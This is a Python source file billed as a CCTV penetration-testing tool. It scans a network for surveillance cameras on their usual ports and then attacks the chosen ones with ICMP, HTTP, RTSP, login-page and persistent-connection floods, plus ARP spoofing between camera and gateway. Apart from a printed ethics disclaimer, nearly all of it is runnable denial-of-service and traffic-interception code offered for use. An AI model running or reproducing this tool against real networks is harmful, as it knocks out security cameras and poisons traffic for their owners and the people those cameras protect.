import os
import sys
import socket
import struct
import time
import random
import ipaddress
import platform
import ctypes
import subprocess
import requests
from threading import Thread, Lock
from queue import Queue
from scapy.all import ARP, send, conf

# --- Fix for PyInstaller stdin issue ---
def fix_stdin():
    """Reopen stdin if lost (common in PyInstaller builds)"""
    try:
        if sys.stdin is None or sys.stdin.closed:
            sys.stdin = open(0, 'rb')
    except Exception as e:
        print(f"Error fixing stdin: {e}")
        sys.exit(1)

# --- Security Warnings ---
def show_security_warnings():
    """Display security and ethical warnings"""
    print("\n" + "=" * 80)
    print("⚠️ ⚠️ ⚠️  WARNING: SECURITY AND ETHICAL CONSIDERATIONS  ⚠️ ⚠️ ⚠️")
    print("=" * 80)
    print("This tool is for educational and authorized penetration testing purposes only.")
    print("Unauthorized use is illegal and unethical. By using this software, you agree that:")
    print("- You have explicit permission to test the target network")
    print("- You will not use this tool for malicious purposes")
    print("- You understand networking laws in your jurisdiction")
    print("- You accept full responsibility for your actions")
    print("\n[!] Network attacks can disrupt services and violate laws")
    print("[!] IP spoofing is detectable and may be traced back to you")
    print("[!] Unauthorized access to systems is illegal")
    print("=" * 80 + "\n")

# --- Admin Permission Functions ---
def is_admin_windows():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def check_admin_permissions():
    if platform.system() == 'Windows':
        if not is_admin_windows():
            print("This program requires Administrator privileges! (Run as Administrator)")
            return False
        return True
    else:
        if os.geteuid() != 0:
            print("This program requires root access! (sudo)")
            return False
        return True

# --- Network Detection Functions ---
def get_available_networks():
    """Find available networks without netifaces"""
    networks = []
    
    if platform.system() == 'Windows':
        try:
            output = subprocess.check_output("ipconfig", shell=True).decode('utf-8', errors='ignore')
            
            for line in output.split('\n'):
                if 'IPv4 Address' in line:
                    ip = line.split(':')[-1].strip()
                elif 'Subnet Mask' in line:
                    netmask = line.split(':')[-1].strip()
                    if 'ip' in locals():
                        network = ipaddress.ip_network(f"{ip}/{netmask}", strict=False)
                        networks.append({
                            'ip': ip,
                            'netmask': netmask,
                            'network': str(network)
                        })
                        del ip
        except:
            pass
        
    else:
        try:
            if os.path.exists('/sbin/ip'):
                output = subprocess.check_output(['/sbin/ip', '-o', '-4', 'addr', 'show']).decode('utf-8')
            else:
                output = subprocess.check_output(['ifconfig']).decode('utf-8')
            
            for line in output.split('\n'):
                if 'inet ' in line:
                    parts = line.strip().split()
                    ip = parts[1].split('/')[0]
                    netmask = '255.255.255.0'
                    
                    if 'netmask' in parts:
                        idx = parts.index('netmask') + 1
                        netmask = parts[idx]
                    elif '/' in parts[1]:
                        prefix = int(parts[1].split('/')[1])
                        netmask = str(ipaddress.IPv4Network(f"0.0.0.0/{prefix}").netmask)
                    
                    network = ipaddress.ip_network(f"{ip}/{netmask}", strict=False)
                    networks.append({
                        'ip': ip,
                        'netmask': netmask,
                        'network': str(network)
                    })
        except:
            pass
    
    return networks

def select_network(networks):
    """Let user select a network"""
    if not networks:
        print("No active networks found! Please enter IP range manually.")
        while True:
            manual_net = input("Enter IP/Subnet range (e.g., 192.168.1.0/24): ")
            try:
                ipaddress.ip_network(manual_net)
                return manual_net
            except:
                print("Invalid network format!")
    
    print("\nAvailable Networks:")
    for i, net in enumerate(networks):
        print(f"{i+1}. IP: {net['ip']} - Network: {net['network']}")
    
    print("0. Enter IP range manually")
    
    while True:
        try:
            choice = int(input("\nSelect network number: "))
            if choice == 0:
                manual_net = input("Enter IP/Subnet range (e.g., 192.168.1.0/24): ")
                try:
                    ipaddress.ip_network(manual_net)
                    return manual_net
                except:
                    print("Invalid network format!")
                    continue
            
            if 1 <= choice <= len(networks):
                return networks[choice-1]['network']
            
            print("Number out of range!")
        except ValueError:
            print("Invalid input!")

# --- CCTV Scanning Functions ---
def scan_cctv_cameras(network):
    """Scan network for CCTV cameras"""
    try:
        network = ipaddress.ip_network(network)
    except:
        print("Invalid network format!")
        return []
    
    print(f"\nScanning network {network} (Total addresses: {network.num_addresses})...")
    
    open_ips = []
    lock = Lock()
    queue = Queue()

    for ip in network.hosts():
        queue.put(str(ip))

    def worker():
        while not queue.empty():
            ip = queue.get()
            if check_cctv_port(ip):
                with lock:
                    open_ips.append(ip)
                    print(f"✅ CCTV found: {ip}")
            queue.task_done()

    threads = []
    thread_count = min(100, network.num_addresses)
    for _ in range(thread_count):
        t = Thread(target=worker, daemon=True)
        t.start()
        threads.append(t)
    
    start_time = time.time()
    queue.join()
    scan_time = time.time() - start_time
    
    print(f"\nScan completed. Time elapsed: {scan_time:.2f} seconds")
    return open_ips

def check_cctv_port(ip, ports=[80, 554, 8000, 8080, 37777, 37778, 34567], timeout=0.3):
    """Check common CCTV ports with updated list"""
    for port in ports:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                s.connect((ip, port))
                return True
        except:
            continue
    return False

# --- Attack Functions (Updated) ---
def create_icmp_packet():
    """Create ICMP packet for attack"""
    header = struct.pack('!BBHHH', 8, 0, 0, 0, 1)
    data = b'X' * 64
    checksum = calculate_checksum(header + data)
    header = struct.pack('!BBHHH', 8, 0, checksum, 0, 1)
    return header + data

def calculate_checksum(data):
    """Calculate checksum"""
    s = 0
    for i in range(0, len(data), 2):
        if i + 1 < len(data):
            word = (data[i] << 8) + data[i+1]
            s += word
        else:
            s += data[i] << 8
    s = (s >> 16) + (s & 0xffff)
    s += s >> 16
    return ~s & 0xffff

def icmp_flood(target_ip):
    """ICMP Flood attack"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        icmp_packet = create_icmp_packet()
        
        print(f"[ICMP] Attacking {target_ip}...")
        
        while True:
            sock.sendto(icmp_packet, (target_ip, 0))
            
    except Exception as e:
        print(f"[ICMP] Attack error: {e}")

def http_flood(target_ip):
    """HTTP Flood attack"""
    url = f"http://{target_ip}/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Accept": "text/html,application/xhtml+xml",
        "Connection": "keep-alive",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    }
    
    print(f"[HTTP] Attacking {target_ip}:80...")
    
    while True:
        try:
            requests.get(url, headers=headers, timeout=0.5)
        except:
            pass

def rtsp_flood(target_ip):
    """RTSP Flood attack"""
    payload = (
        "DESCRIBE rtsp://{}/ RTSP/1.0\r\n"
        "CSeq: 1\r\n"
        "User-Agent: RealPlayer\r\n"
        "Accept: application/sdp\r\n\r\n"
    )
    
    print(f"[RTSP] Attacking {target_ip}:554...")
    
    while True:
        try:
            with socket.socket() as s:
                s.settimeout(0.5)
                s.connect((target_ip, 554))
                s.send(payload.format(target_ip).encode())
        except:
            pass

def camera_login_flood(target_ip):
    """Camera login flood attack"""
    login_urls = [
        f"http://{target_ip}/login.php",
        f"http://{target_ip}/cgi-bin/login.cgi",
        f"http://{target_ip}/web/login"
    ]
    
    print(f"[LOGIN] Attacking {target_ip} login pages...")
    
    while True:
        try:
            url = random.choice(login_urls)
            data = {
                "username": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8)),
                "password": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=12))
            }
            requests.post(url, data=data, timeout=0.3)
        except:
            pass

def arp_spoof(target_ip, gateway_ip):
    """ARP spoofing attack"""
    print(f"[ARP] Poisoning {target_ip} and {gateway_ip}...")
    conf.verb = 0  # Disable scapy output
    
    try:
        while True:
            # Poison target (tell target we are gateway)
            send(ARP(op=2, pdst=target_ip, psrc=gateway_ip))
            
            # Poison gateway (tell gateway we are target)
            send(ARP(op=2, pdst=gateway_ip, psrc=target_ip))
            
            time.sleep(1)
    except Exception as e:
        print(f"[ARP] Error: {e}")

def persistent_http_flood(target_ip):
    """Persistent HTTP connection flood"""
    print(f"[P-HTTP] Starting persistent attack on {target_ip}:80")
    
    while True:
        try:
            s = socket.socket()
            s.connect((target_ip, 80))
            while True:
                s.send(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
                time.sleep(0.01)
        except:
            pass

# --- Target Selection Functions ---
def select_target(cctv_ips):
    """Let user select target(s) from found CCTV cameras"""
    print("\nFound CCTV Cameras:")
    for i, ip in enumerate(cctv_ips):
        print(f"{i+1}. {ip}")
    
    print("\nAttack Options:")
    print("1. Attack a specific CCTV camera")
    print("2. Attack all CCTV cameras")
    print("3. Enter custom target IP")
    
    while True:
        choice = input("\nSelect attack option [1-3]: ")
        
        if choice == '1':
            # Attack specific camera
            try:
                camera_num = int(input(f"Enter camera number [1-{len(cctv_ips)}]: "))
                if 1 <= camera_num <= len(cctv_ips):
                    return [cctv_ips[camera_num-1]]
                print("Invalid camera number!")
            except ValueError:
                print("Please enter a valid number!")
                
        elif choice == '2':
            # Attack all cameras
            confirm = input(f"Attack ALL {len(cctv_ips)} cameras? (y/n): ").lower()
            if confirm == 'y':
                return cctv_ips
            return []
            
        elif choice == '3':
            # Custom target
            custom_ip = input("Enter target IP: ")
            try:
                socket.inet_aton(custom_ip)  # Validate IP format
                return [custom_ip]
            except socket.error:
                print("Invalid IP address format!")
        else:
            print("Invalid choice!")

# --- Main Program ---
if __name__ == "__main__":
    # Fix stdin issue in PyInstaller builds
    fix_stdin()
    
    # Show security warnings
    show_security_warnings()
    
    # Check admin permissions
    if not check_admin_permissions():
        sys.exit(1)

    print("=== Advanced CCTV Penetration Testing Tool ===")
    
    # Detect available networks
    networks = get_available_networks()
    
    # Let user select network
    target_network = select_network(networks)
    print(f"\nSelected network: {target_network}")
    
    # Scan for CCTV cameras with updated ports
    cctv_ips = scan_cctv_cameras(target_network)
    
    if not cctv_ips:
        print("\n❌ No CCTV cameras found.")
        sys.exit(0)
    
    print(f"\nFound {len(cctv_ips)} CCTV cameras:")
    print("IP List:", ", ".join(cctv_ips))
    
    # Let user select targets
    target_ips = select_target(cctv_ips)
    
    if not target_ips:
        print("\nNo targets selected. Exiting.")
        sys.exit(0)
    
    # Get gateway for ARP spoofing
    gateway = input("\nEnter gateway IP for ARP spoofing (e.g., 192.168.1.1): ").strip()
    if not gateway:
        print("ARP spoofing disabled")
        gateway = None
    
    # Confirm attack
    target_desc = f"{len(target_ips)} targets" if len(target_ips) > 1 else target_ips[0]
    confirm = input(f"\nAttack {target_desc}? (y/n): ").lower()
    if confirm != 'y':
        print("Operation cancelled.")
        sys.exit(0)
    
    # Launch attacks
    print(f"\n🔥 Starting advanced attacks on {len(target_ips)} targets...")
    print("Press Ctrl+C to stop all attacks\n")
    
    for target_ip in target_ips:
        # Start ARP spoofing if gateway provided
        if gateway:
            Thread(target=arp_spoof, args=(target_ip, gateway), daemon=True).start()
        
        # Start ICMP flood
        Thread(target=icmp_flood, args=(target_ip,), daemon=True).start()
        
        # Start HTTP flood
        Thread(target=http_flood, args=(target_ip,), daemon=True).start()
        
        # Start RTSP flood
        Thread(target=rtsp_flood, args=(target_ip,), daemon=True).start()
        
        # Start login flood
        Thread(target=camera_login_flood, args=(target_ip,), daemon=True).start()
        
        # Start persistent HTTP attacks (5 threads per target)
        for _ in range(5):
            Thread(target=persistent_http_flood, args=(target_ip,), daemon=True).start()
    
    try:
        # Keep main thread running
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nAll attacks stopped.")
        sys.exit(0)